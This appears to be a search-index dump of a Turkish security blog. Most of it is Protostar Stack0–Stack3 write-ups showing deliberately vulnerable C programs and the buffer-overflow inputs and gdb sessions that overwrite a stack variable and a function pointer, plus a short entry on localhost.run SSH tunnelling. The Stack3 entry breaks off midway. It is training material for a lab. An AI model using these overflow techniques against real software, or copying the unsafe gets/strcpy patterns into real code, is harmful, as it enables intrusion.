[{"body":"","excerpt":"","ref":"/etiketler/di%C4%9Fer/","title":"diğer"},{"body":"","excerpt":"","ref":"/etiketler/","title":"Etiketler"},{"body":"Localhost.run size NAT (Network Address Translation), CGNAT (Carrier Grade NAT) veya firewall arkasında olan cihazlarınıza uzaktan SSH tünelleme kullanarak erişilebilir hale getiren cloud tabanlı bir hizmettir. Bu hizmeti kullanabilmek için ekstra herhangi bir indirme yapmanız gerekmemektedir. Tek satır ssh komutu kullanarak cihazınızda istediğiniz portu http://*.localhost.run/ subdomainine yönlendirebilirsiniz. ( https destekliyor )\nssh -R 80:localhost:\u0026lt;Lokal-Port\u0026gt; ssh.localhost.run\n8080 portunda çalışan bir servis için bu komut şu şekilde görünecektir.\nssh -R 80:localhost:8080 ssh.localhost.run\n$ ssh -R 80:localhost:8080 ssh.localhost.run The authenticity of host \u0026#39;ssh.localhost.run (35.193.161.204)\u0026#39; can\u0026#39;t be established. RSA key fingerprint is SHA256:FV8IMJ4IYjYUTnd6on7PqbRjaZf4c1EhhEBgeUdE94I. Are you sure you want to continue connecting (yes/no)? yes Connect to http://xf61.localhost.run or https://xf61.localhost.run Daha sonra herhangi bir cihazdan https://xf61.localhost.run adresine giderek uzaktan yukarıdaki ssh komutu çalıştırılan porttaki servise erişilebilir.\n","excerpt":"Localhost.run size NAT (Network Address Translation), CGNAT (Carrier Grade NAT) veya firewall arkasında olan cihazlarınıza uzaktan SSH tünelleme kullanarak erişilebilir hale getiren cloud tabanlı bir hizmettir. Bu hizmeti kullanabilmek için ekstra herhangi bir indirme yapmanız gerekmemektedir. Tek satır ssh komutu kullanarak cihazınızda istediğiniz portu http://*.localhost.run/ subdomainine yönlendirebilirsiniz. ( https destekliyor )\nssh -R 80:localhost:\u0026lt;Lokal-Port\u0026gt; ssh.localhost.run\n8080 portunda çalışan bir servis için bu komut şu şekilde görünecektir.\nssh -R 80:localhost:8080 ssh.localhost.run","ref":"/yaz%C4%B1lar/localhost_run/","title":"Localhost.run"},{"body":"","excerpt":"","ref":"/seriler/protostar/","title":"Protostar"},{"body":"","excerpt":"","ref":"/etiketler/protostar/","title":"Protostar"},{"body":"","excerpt":"","ref":"/yaz%C4%B1lar/protostar/","title":"Protostar"},{"body":"","excerpt":"","ref":"/seriler/","title":"Seriler"},{"body":" Stack0.c #include \u0026lt;stdlib.h\u0026gt;#include \u0026lt;unistd.h\u0026gt;#include \u0026lt;stdio.h\u0026gt; int main(int argc, char **argv) { volatile int modified; char buffer[64]; modified = 0; gets(buffer); if(modified != 0) { printf(\u0026#34;you have changed the \u0026#39;modified\u0026#39; variable\\n\u0026#34;); } else { printf(\u0026#34;Try again?\\n\u0026#34;); } } Amaç: \u0026ldquo;you have changed the \u0026lsquo;modified\u0026rsquo; variable\u0026rdquo; satırını yazdırmak.\nİstediğimiz cümleyi yazdırabilmemiz için programın akışını değiştirilebilmemiz gerekiyor. Bunun için bir yukarıdaki if koşulunun sağlanması gerekmekte, bunun içinde modified değişkeninin yukarıda tanımlanan 0 değerinden başka bir değere sahip olması gerekmekte.\nProgramın çalıştırılması user@protostar:/opt/protostar/bin$ ./stack0 Merhaba Try again? Programmı çalıştırdığım zaman gets() fonksiyonuyla kullanıcıdan stdin\u0026rsquo;den değer aldığını daha sonra modified değişkeni hala 0 olduğu için \u0026ldquo;Try again?\u0026rdquo; mesajını yazdırdığını görüyoruz.\ngets() Fonsiyonundaki Sorun Burada gets() fonksiyonuna dikkat etmek gerekiyor. Eğer man sayfalarını kontrol edecek olursak.\nNever use gets(). Because it is impossible to tell without knowing the data in advance how many characters gets() will read, and because gets() will continue to store characters past the end of the buffer, it is extremely dangerous to use. It has been used to break computer security.\nYani gets() fonksiyonu stack frame\u0026rsquo;e istediğimiz gibi doldurabilmemize olanak sağlıyor. Burada stack frame ile kast edilen şey programdaki fonksiyonları lokal değişkenleri stack içerisinde atılır ve her fonksiyonun kendine ait bir stack frame\u0026rsquo;i bulunur. Böylece program içerisindeki fonksiyonlar birbirlerinin değişkenlerine erişemezler. -Global değişkenler bundan farklı olarak adresleri ile çağırılırlar ve bu değişkenler stack veya heap dışında Data Section tutulur.\nÇalıştırılabilir dosyanın bölümleri  Code (Text) Data Stack Heap  Code (Text): Basitçe makina kodlarının bulunduğu bölüm.\nData: Global ve statik değişken adreslerinin bulunduğu bölüm.\nStack: Lokal değişkenlerin bulunduğu bölüm. Belleğin sonundan Data kısmına doğru büyür. -Stack pointerin adresi küçülür-\nHeap: Dinamik değişkenlerin bulunduğu bölüm. Data bölümünden belleğin alt kısımlarına doğru büyür.\nModified Değişkenini Değiştirilmesi Yukarıdaki bilgiler doğrultusunda gets() fonksiyonunu kullanarak aynı stack frame\u0026rsquo;de bulunan modified değişkenini değiştirebiliriz. Bunu yapmak aslında çok kolay. Programa input verirken buffer[64]\u0026lsquo;ı doldurduktan sonra yazmaya devam etmemiz yeterli.\nİstediğim kadar harf üretebilmek için python\u0026rsquo;dan yardım alıyorum\nuser@protostar:/opt/protostar/bin$ python -c \u0026#34;print(\u0026#39;A\u0026#39;*64)\u0026#34; AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA 64 tane A verdiğimiz zaman ilk seferde çalıştırdığımdaki çıktıyı görüyorum bu zaten buffer dolduğu fakat modified değişkeni değişmediği için beklenilen sonuç.\nuser@protostar:/opt/protostar/bin$ ./stack0 #64 Tane A AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA Try again? Buffer dolduktan hemen sonra modified (int) değişkeni(4 byte) olduğu için sadece tek bir byte\u0026rsquo;ını değiştirmem yetti.\nuser@protostar:/opt/protostar/bin$ ./stack0 #65 Tane A AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA you have changed the \u0026#39;modified\u0026#39; variable Eğer buffer ve 4byte\u0026rsquo;lık modified değişkenini değiştirdikten sonra yazmaya devam edersek \u0026ldquo;Segmentation fault\u0026rdquo; denilen hata ile karşılaşırız. Segmentation Fault programın kendi hafıza alanının dışındaki bir adrese erişmeye çalıştığı zaman işletim sistemi tarafından döndürülen bir hatadır.\nuser@protostar:/opt/protostar/bin$ ./stack0 #100 Tane A AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA you have changed the \u0026#39;modified\u0026#39; variable Segmentation fault","excerpt":"Stack0.c #include \u0026lt;stdlib.h\u0026gt;#include \u0026lt;unistd.h\u0026gt;#include \u0026lt;stdio.h\u0026gt; int main(int argc, char **argv) { volatile int modified; char buffer[64]; modified = 0; gets(buffer); if(modified != 0) { printf(\u0026#34;you have changed the \u0026#39;modified\u0026#39; variable\\n\u0026#34;); } else { printf(\u0026#34;Try again?\\n\u0026#34;); } } Amaç: \u0026ldquo;you have changed the \u0026lsquo;modified\u0026rsquo; variable\u0026rdquo; satırını yazdırmak.\nİstediğimiz cümleyi yazdırabilmemiz için programın akışını değiştirilebilmemiz gerekiyor. Bunun için bir yukarıdaki if koşulunun sağlanması gerekmekte, bunun içinde modified değişkeninin yukarıda tanımlanan 0 değerinden başka bir değere sahip olması gerekmekte.","ref":"/yaz%C4%B1lar/protostar/stack0/","title":"Stack 0"},{"body":" Stack1.c #include \u0026lt;stdlib.h\u0026gt;#include \u0026lt;unistd.h\u0026gt;#include \u0026lt;stdio.h\u0026gt;#include \u0026lt;string.h\u0026gt; int main(int argc, char **argv) { volatile int modified; char buffer[64]; if(argc == 1) { errx(1, \u0026#34;please specify an argument\\n\u0026#34;); } modified = 0; strcpy(buffer, argv[1]); if(modified == 0x61626364) { printf(\u0026#34;you have correctly got the variable to the right value\\n\u0026#34;); } else { printf(\u0026#34;Try again, you got 0x%08x\\n\u0026#34;, modified); } } Amaç: \u0026ldquo;you have correctly got the variable to the right value\u0026rdquo; satırını yazdırmak.\nBu seviyede de istediğiğimiz cümleyi yazdırabilmek için programın akışını daha spesifik bir şekilde değiştirmemiz gerekiyor. Önceki seviyede modified değişkeni 0 haricinde bir değer olması yeterken şimdi 0x61626364 değerine eşit olması gerekmekte.\nProgramın çalıştırılması user@protostar:/opt/protostar/bin$ ./stack1 stack1: please specify an argument user@protostar:/opt/protostar/bin$ ./stack1 Merhaba Try again, you got 0x00000000 Program çalıştırıldığı zaman bir önceki seviyedeki gibi herhangi bir input beklemeden argüman belirtiniz çıktısı veriyor. Herhangi bir argüman verdiğim zaman ise Tekrar deneyin diyip o anki modified değişkeninin değerini hex olarak yazdırıyor. Bu seviyeyide aynı şekilde uzun bir değer verdikten sonra geçebiliriz. Fakat gdb (gnu debugger)\u0026lsquo;dan bahsetmek istiyorum. GDB ile bir programı açıp satır satır assembly kodlarını inceleyebilir, değişiklik yapabilir veya programın akışını değiştirebiliriz.\nGDB ve AT\u0026amp;T Sentaks Aşağıdaki çıktıyı biraz yorumlayarak basitleştirmek gerekirse. Sol taraftaki 0x ile başlayan 16lı tabanındaki sayılar, sağ tarafındaki opcode ve argüman(lar)\u0026lsquo;ın saklandığı hafıza adresleridir.\nŞuan sağdaki argümanlar biraz göz korkutucu görünebilir bunun yerine şu anda varsayılan olan AT\u0026amp;T sentaksını intel ile değiştireceğim.\nuser@protostar:/opt/protostar/bin$ gdb stack1 Reading symbols from /opt/protostar/bin/stack1...done. (gdb) b main Breakpoint 1 at 0x804846d: file stack1/stack1.c, line 11. (gdb) disassemble main Dump of assembler code for function main: 0x08048464 \u0026lt;main+0\u0026gt;: push %ebp 0x08048465 \u0026lt;main+1\u0026gt;: mov %esp,%ebp 0x08048467 \u0026lt;main+3\u0026gt;: and $0xfffffff0,%esp 0x0804846a \u0026lt;main+6\u0026gt;: sub $0x60,%esp 0x0804846d \u0026lt;main+9\u0026gt;: cmpl $0x1,0x8(%ebp) 0x08048471 \u0026lt;main+13\u0026gt;: jne 0x8048487 \u0026lt;main+35\u0026gt; 0x08048473 \u0026lt;main+15\u0026gt;: movl $0x80485a0,0x4(%esp) 0x0804847b \u0026lt;main+23\u0026gt;: movl $0x1,(%esp) 0x08048482 \u0026lt;main+30\u0026gt;: call 0x8048388 \u0026lt;errx@plt\u0026gt; 0x08048487 \u0026lt;main+35\u0026gt;: movl $0x0,0x5c(%esp) 0x0804848f \u0026lt;main+43\u0026gt;: mov 0xc(%ebp),%eax 0x08048492 \u0026lt;main+46\u0026gt;: add $0x4,%eax 0x08048495 \u0026lt;main+49\u0026gt;: mov (%eax),%eax 0x08048497 \u0026lt;main+51\u0026gt;: mov %eax,0x4(%esp) 0x0804849b \u0026lt;main+55\u0026gt;: lea 0x1c(%esp),%eax 0x0804849f \u0026lt;main+59\u0026gt;: mov %eax,(%esp) 0x080484a2 \u0026lt;main+62\u0026gt;: call 0x8048368 \u0026lt;strcpy@plt\u0026gt; 0x080484a7 \u0026lt;main+67\u0026gt;: mov 0x5c(%esp),%eax 0x080484ab \u0026lt;main+71\u0026gt;: cmp $0x61626364,%eax 0x080484b0 \u0026lt;main+76\u0026gt;: jne 0x80484c0 \u0026lt;main+92\u0026gt; 0x080484b2 \u0026lt;main+78\u0026gt;: movl $0x80485bc,(%esp) 0x080484b9 \u0026lt;main+85\u0026gt;: call 0x8048398 \u0026lt;puts@plt\u0026gt; 0x080484be \u0026lt;main+90\u0026gt;: jmp 0x80484d5 \u0026lt;main+113\u0026gt; 0x080484c0 \u0026lt;main+92\u0026gt;: mov 0x5c(%esp),%edx 0x080484c4 \u0026lt;main+96\u0026gt;: mov $0x80485f3,%eax 0x080484c9 \u0026lt;main+101\u0026gt;: mov %edx,0x4(%esp) 0x080484cd \u0026lt;main+105\u0026gt;: mov %eax,(%esp) 0x080484d0 \u0026lt;main+108\u0026gt;: call 0x8048378 \u0026lt;printf@plt\u0026gt; 0x080484d5 \u0026lt;main+113\u0026gt;: leave 0x080484d6 \u0026lt;main+114\u0026gt;: ret End of assembler dump. GDB İntel Sentaks Intel sentaksına geçmek için gdb de set disassembly-flavor intel yazıp tekrardan main fonksiyonunun makina kodlarını assembly kodlarına çeviriyorum. -disassemble-\n(gdb) set disassembly-flavor intel (gdb) disassemble main Dump of assembler code for function main: 0x08048464 \u0026lt;main+0\u0026gt;: push ebp 0x08048465 \u0026lt;main+1\u0026gt;: mov ebp,esp 0x08048467 \u0026lt;main+3\u0026gt;: and esp,0xfffffff0 0x0804846a \u0026lt;main+6\u0026gt;: sub esp,0x60 0x0804846d \u0026lt;main+9\u0026gt;: cmp DWORD PTR [ebp+0x8],0x1 0x08048471 \u0026lt;main+13\u0026gt;: jne 0x8048487 \u0026lt;main+35\u0026gt; 0x08048473 \u0026lt;main+15\u0026gt;: mov DWORD PTR [esp+0x4],0x80485a0 0x0804847b \u0026lt;main+23\u0026gt;: mov DWORD PTR [esp],0x1 0x08048482 \u0026lt;main+30\u0026gt;: call 0x8048388 \u0026lt;errx@plt\u0026gt; 0x08048487 \u0026lt;main+35\u0026gt;: mov DWORD PTR [esp+0x5c],0x0 0x0804848f \u0026lt;main+43\u0026gt;: mov eax,DWORD PTR [ebp+0xc] 0x08048492 \u0026lt;main+46\u0026gt;: add eax,0x4 0x08048495 \u0026lt;main+49\u0026gt;: mov eax,DWORD PTR [eax] 0x08048497 \u0026lt;main+51\u0026gt;: mov DWORD PTR [esp+0x4],eax 0x0804849b \u0026lt;main+55\u0026gt;: lea eax,[esp+0x1c] 0x0804849f \u0026lt;main+59\u0026gt;: mov DWORD PTR [esp],eax 0x080484a2 \u0026lt;main+62\u0026gt;: call 0x8048368 \u0026lt;strcpy@plt\u0026gt; 0x080484a7 \u0026lt;main+67\u0026gt;: mov eax,DWORD PTR [esp+0x5c] 0x080484ab \u0026lt;main+71\u0026gt;: cmp eax,0x61626364 0x080484b0 \u0026lt;main+76\u0026gt;: jne 0x80484c0 \u0026lt;main+92\u0026gt; 0x080484b2 \u0026lt;main+78\u0026gt;: mov DWORD PTR [esp],0x80485bc 0x080484b9 \u0026lt;main+85\u0026gt;: call 0x8048398 \u0026lt;puts@plt\u0026gt; 0x080484be \u0026lt;main+90\u0026gt;: jmp 0x80484d5 \u0026lt;main+113\u0026gt; 0x080484c0 \u0026lt;main+92\u0026gt;: mov edx,DWORD PTR [esp+0x5c] 0x080484c4 \u0026lt;main+96\u0026gt;: mov eax,0x80485f3 0x080484c9 \u0026lt;main+101\u0026gt;: mov DWORD PTR [esp+0x4],edx 0x080484cd \u0026lt;main+105\u0026gt;: mov DWORD PTR [esp],eax 0x080484d0 \u0026lt;main+108\u0026gt;: call 0x8048378 \u0026lt;printf@plt\u0026gt; 0x080484d5 \u0026lt;main+113\u0026gt;: leave 0x080484d6 \u0026lt;main+114\u0026gt;: ret End of assembler dump. Virgül yerine boşluk görmek ve registerların başında % görmemek okumayı kolaylaştırıyor. İki sentaksın aralarındaki tek fark bu değil aynı zamanda assign yani atama yapılan yerde değişiyor.\nIntel Sentaks | opcode | hedef,kaynak | | mov | eax,[ecx] |\nAT\u0026amp;T Sentaks | opcode | kaynak,hedef | | movl | (%ecx),%eax |\nModified Değişkenini Değiştirilmesi Aşağıdaki gibi bir kaç şekilde stack1 programına argüman yollayabiliriz.\nuser@protostar:/opt/protostar/bin$ ./stack1 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA #64 tane A Try again, you got 0x00000000 user@protostar:/opt/protostar/bin$ ./stack1 $(python -c \u0026#34;print(\u0026#39;A\u0026#39;*64)\u0026#34;) Try again, you got 0x00000000 user@protostar:/opt/protostar/bin$ ./stack1 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAC Try again, you got 0x00000043 user@protostar:/opt/protostar/bin$ ./stack1 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACCCC Try again, you got 0x43434343 user@protostar:/opt/protostar/bin$ ./stack1 $(python -c \u0026#34;print(\u0026#39;A\u0026#39;*64+\u0026#39;CCCC\u0026#39;)\u0026#34;) Try again, you got 0x43434343 user@protostar:/opt/protostar/bin$ ./stack1 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAADEFG Try again, you got 0x47464544 Bir önceki seviyede olduğu gibi 64 tane A(0x41) harfiyle bufferi dolduruyorum. Bunu daha kısa bir şekilde pythondan yardım alarak doldurabileceğimi söylemiştim. Burada dikkat çekmek istediğim son iki örnekte modified variable yerine istediğimi yazdırabiliyor oluşum. Fakat yazdırırken dikkat etmem gereken bir nokta sondan bir önceki 64 tane A ve bir tane C olan örnekte değerim 0x00000043 olması. Yani benim her modified değişkenine yazdığım harf tersten gözüküyor bunun sebebi bizim Big Endian olarak düşünmemiz ama makinaların Little Endian olarak çalışmasından kaynaklanıyor. Aralarındaki temel fark en kıymetli bitin solda yada sağda olmasıdır.\nMadem istediğimiz şekilde modified değişkenini değiştirebiliyoruz o zaman bizden istenen değeri yazmayı deniyelim. [[#Stack1.c|Stack1.c]]\u0026lsquo;deki if(modified==0x61626364) değerine bakacak olursak. 0x61626364 değerini modified değişkenine yazmak için bu sayıların ascii karşılığına pythondan yardım alarak buluyorum.\n$ python3 Python 3.7.1 (default, Oct 22 2018, 10:41:28) [GCC 8.2.1 20180831] on linux \u0026gt;\u0026gt;\u0026gt; chr(0x61) \u0026#39;a\u0026#39; \u0026gt;\u0026gt;\u0026gt; chr(0x62) \u0026#39;b\u0026#39; \u0026gt;\u0026gt;\u0026gt; chr(0x63) \u0026#39;c\u0026#39; \u0026gt;\u0026gt;\u0026gt; chr(0x64) \u0026#39;d\u0026#39; Demek ki ben 64lük buffer\u0026rsquo;ı doldurduktan sonra abcd yazarsam bölümü geçebilirim.\nuser@protostar:/opt/protostar/bin$ ./stack1 $(python -c \u0026#34;print(\u0026#39;A\u0026#39;*64+\u0026#39;abcd\u0026#39;)\u0026#34;) Try again, you got 0x64636261 Little Endian\u0026lsquo;a dikkat ederek :)\nuser@protostar:/opt/protostar/bin$ ./stack1 $(python -c \u0026#34;print(\u0026#39;A\u0026#39;*64+\u0026#39;dcba\u0026#39;)\u0026#34;) you have correctly got the variable to the right value GDB hook-stop GDB\u0026rsquo;de hook-stop denilen programın akışı her durdurulduğunda istediğimiz komutları sanki o komutları yazmışız gibi çalıştıran bir komut seti kuralı yazabiliriz.\n(gdb) define hook-stop Type commands for definition of \u0026#34;hook-stop\u0026#34;. End with a line saying just \u0026#34;end\u0026#34;. \u0026gt;info registers # register\u0026#39;ların durumunu gösterir \u0026gt;x/i $eip # bir sonraki çalıştırılacak komutu gösterir \u0026gt;x/16wx $esp # Stack\u0026#39;in durumunu 16word olarak gösterir \u0026gt;end 1 word 4byte olarak gdb içinde tanımlanmıştır.\nStack 0\u0026lsquo;da bahsettiğim gibi stack lokal değişkenlerin tutulduğu bir veri yapısıdır. Bu sayede bir programın içerisinde aynı değişken ismi farklı fonksiyonlar içerisinde yer alabilir.\nÖrnek vermek gerekirse programın içinde birden fazla i değişkeni olmasına rağmen bir fonksiyonun içerisinde sadece tek i değişkeni bulunabilir. Bunun olmasını sağlayan stack frame denilen, her fonksiyon için kendine ait bir stack alanının bulunmasıdır.\nuser@protostar:/opt/protostar/bin$ gdb stack1 -q # -q Banneri görmemek için Reading symbols from /opt/protostar/bin/stack1...done. (gdb) set disassembly-flavor intel (gdb) define hook-stop Type commands for definition of \u0026#34;hook-stop\u0026#34;. End with a line saying just \u0026#34;end\u0026#34;. \u0026gt;info registers \u0026gt;x/i $eip \u0026gt;x/16wx $esp \u0026gt;end (gdb) r AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAdcba eax 0x61626364 1633837924 ecx 0x0 0 edx 0x45 69 ebx 0xb7fd7ff4 -1208123404 esp 0xbffff6f0 0xbffff6f0 ebp 0xbffff758 0xbffff758 esi 0x0 0 edi 0x0 0 eip 0x80484b9 0x80484b9 \u0026lt;main+85\u0026gt; eflags 0x200246 [ PF ZF IF ID ] cs 0x73 115 ss 0x7b 123 ds 0x7b 123 es 0x7b 123 fs 0x0 0 gs 0x33 51 0x80484b9 \u0026lt;main+85\u0026gt;: call 0x8048398 \u0026lt;puts@plt\u0026gt; 0xbffff6f0: 0x080485bc 0xbffff93e 0xb7fff8f8 0xb7f0186e 0xbffff700: 0xb7fd7ff4 0xb7ec6165 0xbffff718 0x41414141 0xbffff710: 0x41414141 0x41414141 0x41414141 0x41414141 0xbffff720: 0x41414141 0x41414141 0x41414141 0x41414141 0x080484b9 19 in stack1/stack1.c (gdb) ni ... ... Aşağıdaki mesajı görene kadar ni yazıp stacke bakalım ... you have correctly got the variable to the right value (gdb) x/24wx $esp 0xbffff6f0: 0x080485bc 0xbffff93e 0xb7fff8f8 0xb7f0186e 0xbffff700: 0xb7fd7ff4 0xb7ec6165 0xbffff718 0x41414141 0xbffff710: 0x41414141 0x41414141 0x41414141 0x41414141 0xbffff720: 0x41414141 0x41414141 0x41414141 0x41414141 0xbffff730: 0x41414141 0x41414141 0x41414141 0x41414141 0xbffff740: 0x41414141 0x41414141 0x41414141 0x61626364 Görüldüğü gibi 4 satır 0x41414141 ile dolu ve en sonda da bizim 0x61626364 yazdığımız dcba değeri bulunmakta. Her bir 0x41414141 4 byte olup toplam 16 tane word olduğunu hesaplarsak bu programdaki 64byte olan buffer\u0026rsquo;ı doldurduğumuzu görebiliriz. Sonrasındaki 0x61626364 modified değişkeni oluyor.\nBunu şu şekilde ispatlayabiliriz sadece 64byte\u0026rsquo;lık bir payload ile çalıştırdığımızda stackteki modified değişkeninin bulunduğu adresin 0 olmasını bekleriz.\n... Üstteki gdb örneğinin aynısı. Sadece 68byte yerine ... 64byte\u0026#39;lık payload verdim. (gdb) x/24wx $esp 0xbffff6f0: 0xbffff70c 0xbffff942 0xb7fff8f8 0xb7f0186e 0xbffff700: 0xb7fd7ff4 0xb7ec6165 0xbffff718 0x41414141 0xbffff710: 0x41414141 0x41414141 0x41414141 0x41414141 0xbffff720: 0x41414141 0x41414141 0x41414141 0x41414141 0xbffff730: 0x41414141 0x41414141 0x41414141 0x41414141 0xbffff740: 0x41414141 0x41414141 0x41414141 0x00000000","excerpt":"Stack1.c #include \u0026lt;stdlib.h\u0026gt;#include \u0026lt;unistd.h\u0026gt;#include \u0026lt;stdio.h\u0026gt;#include \u0026lt;string.h\u0026gt; int main(int argc, char **argv) { volatile int modified; char buffer[64]; if(argc == 1) { errx(1, \u0026#34;please specify an argument\\n\u0026#34;); } modified = 0; strcpy(buffer, argv[1]); if(modified == 0x61626364) { printf(\u0026#34;you have correctly got the variable to the right value\\n\u0026#34;); } else { printf(\u0026#34;Try again, you got 0x%08x\\n\u0026#34;, modified); } } Amaç: \u0026ldquo;you have correctly got the variable to the right value\u0026rdquo; satırını yazdırmak.","ref":"/yaz%C4%B1lar/protostar/stack1/","title":"Stack 1"},{"body":" Stack2.c #include \u0026lt;stdlib.h\u0026gt;#include \u0026lt;unistd.h\u0026gt;#include \u0026lt;stdio.h\u0026gt;#include \u0026lt;string.h\u0026gt; int main(int argc, char **argv) { volatile int modified; char buffer[64]; char *variable; variable = getenv(\u0026#34;GREENIE\u0026#34;); if(variable == NULL) { errx(1, \u0026#34;please set the GREENIE environment variable\\n\u0026#34;); } modified = 0; strcpy(buffer, variable); if(modified == 0x0d0a0d0a) { printf(\u0026#34;you have correctly modified the variable\\n\u0026#34;); } else { printf(\u0026#34;Try again, you got 0x%08x\\n\u0026#34;, modified); } } Amaç: \u0026ldquo;you have correctly got the variable to the right value\u0026rdquo; satırını yazdırmak.\nBu seviyede de istediğimiz cümleyi yazdırabilmek için programın akışını bir şekilde değiştirmemiz gerekiyor. Önceki seviyede modified değişkeni 0x61626364 olması yeterken şimdi kabuktaki GREENIE değişkeni 0x0d0a0d0a olmalı.\nProgramın çalıştırılması user@protostar:/opt/protostar/bin$ ./stack2 stack2: please set the GREENIE environment variable Program çalıştırıldığı zaman bir önceki seviyedeki gibi herhangi bir input beklemeden, GREENIE değerini atamamızı istiyor. Bir önceki seviyeden farkı sadece programa doğrudan değil dolaylı yoldan Kabuk değişkenini kullanarak program akışını değiştirecek olmamız.\nBu seviyeyide aynı şekilde uzun bir text verdikten sonra modified değişkenini değiştirip programın akışını istediğimiz şekilde yönlendirebiliriz. Bunun için öncelikle bufferımızı doldurup modified\u0026lsquo;in değerini değiştirebildiğimizi görelim.\n# 64 Tane \u0026#34;A\u0026#34; karakteri user@protostar:/opt/protostar/bin$ export GREENIE=\u0026#39;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\u0026#39; ; ./stack2 Try again, you got 0x00000000 # 64 Tane \u0026#34;A\u0026#34; karakteri + 4 tane B user@protostar:/opt/protostar/bin$ export GREENIE=\u0026#39;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB\u0026#39; ; ./stack2 Try again, you got 0x42424242 Evet bu şekilde modified değişkenini istediğimiz şekilde değiştirebildiğimize göre bölümü bitirmek için istenilen değeri yazabilliriz.\nModified Değişkeninin Değiştirilmesi Koddaki if(modified == 0x0d0a0d0a) değerini Little Endiana göre yazdığım 0a0d0a0d yani \\x0a\\x0d\\x0a\\x0d değerini yazmam gerektiğini görüyorum. Bunu iki şekilde basitçe payloadıma ekleyebilirim.\nEcho ile \u0026ldquo;\\x0a\\x0d\\x0a\\x0d\u0026rdquo; değerini yazdırmak istersem, hex sayıları yazdırabilmem için -e parametresini ekliyorum.\nuser@protostar:/opt/protostar/bin$ export GREENIE=$(echo -e \u0026#39;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\\x0a\\x0d\\x0a\\x0d\u0026#39;) user@protostar:/opt/protostar/bin$ ./stack2 you have correctly modified the variable Python ile:\nuser@protostar:/opt/protostar/bin$ export GREENIE=$(python -c \u0026#39;print 64*\u0026#34;A\u0026#34;+\u0026#34;\\x0a\\x0d\\x0a\\x0d\u0026#34;\u0026#39;) user@protostar:/opt/protostar/bin$ ./stack2 you have correctly modified the variable","excerpt":"Stack2.c #include \u0026lt;stdlib.h\u0026gt;#include \u0026lt;unistd.h\u0026gt;#include \u0026lt;stdio.h\u0026gt;#include \u0026lt;string.h\u0026gt; int main(int argc, char **argv) { volatile int modified; char buffer[64]; char *variable; variable = getenv(\u0026#34;GREENIE\u0026#34;); if(variable == NULL) { errx(1, \u0026#34;please set the GREENIE environment variable\\n\u0026#34;); } modified = 0; strcpy(buffer, variable); if(modified == 0x0d0a0d0a) { printf(\u0026#34;you have correctly modified the variable\\n\u0026#34;); } else { printf(\u0026#34;Try again, you got 0x%08x\\n\u0026#34;, modified); } } Amaç: \u0026ldquo;you have correctly got the variable to the right value\u0026rdquo; satırını yazdırmak.","ref":"/yaz%C4%B1lar/protostar/stack2/","title":"Stack 2"},{"body":" Stack3.c #include \u0026lt;stdlib.h\u0026gt;#include \u0026lt;unistd.h\u0026gt;#include \u0026lt;stdio.h\u0026gt;#include \u0026lt;string.h\u0026gt; void win() { printf(\u0026#34;code flow successfully changed\\n\u0026#34;); } int main(int argc, char **argv) { volatile int (*fp)(); char buffer[64]; fp = 0; gets(buffer); if(fp) { printf(\u0026#34;calling function pointer, jumping to 0x%08x\\n\u0026#34;, fp); fp(); } } Amaç: main fonksiyonu içerisinde çağırılmayan bir fonksiyonu değişkenin değeri değiştirilerek programın akışına manipüle etmek.\nProgramın Çalıştırılması user@protostar:/opt/protostar/bin$ ./stack3 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA # 64 Tane A user@protostar:/opt/protostar/bin$ ./stack3 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACCCC calling function pointer, jumping to 0x43434343 Segmentation fault Program çalıştırıldığı zaman kullanıcıdan bir giriş bekliyor. Buffer değişkeni 64 byte olduğu için 64byte uzunluğunda bir karakter dizesi verererek programı incelemeye başlıyorum.\nvolatile int (*fp)(); /* Fonksiyon Pointerin tanımlanması */ ... fp = 0; /* Fonksiyon adresi olarak 0 atanması */ Öncelikle fp fonksiyon pointeri main fonksiyonunda çağırıldığı için fp değişkenini istediğimiz fonksiyonun adresi ile değiştirebilirsek programın akışını değiştirebiliriz. fp main fonksiyonu içinde lokal değişken olarak tanımlandıkğı için stack taşırılarak fp değişkeni değiştirilebilir. fp 4 byte olduğu için 4 adet C karakteri ekleyerek fp fonksiyonu çağırıldığında 0 yerine 0x434343 adresindeki kodun çalıştırmasını bekliyorum.\nuser@protostar:/opt/protostar/bin$ ./stack3 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACCCC calling function pointer, jumping to 0x43434343 Segmentation fault Ekrana calling function pointer, jumping to 0x43434343 yazdırıldığına göre programın akışını değiştirdik fakat o adrese erişim yetkimiz olmadığı için Segmentation fault hatası aldık. Geriye sadece zıplamak istediğimiz fonksiyonun adresini bulmak kaldı.\nProgramın dönüş adresini bulabilmek için objdump aracını ve gdb kullanımı aşağıdaki gibidir.\nwin Fonksiyonunun Adresinin Bulunması Objdump user@protostar:/opt/protostar/bin$ objdump -S stack3 | grep win 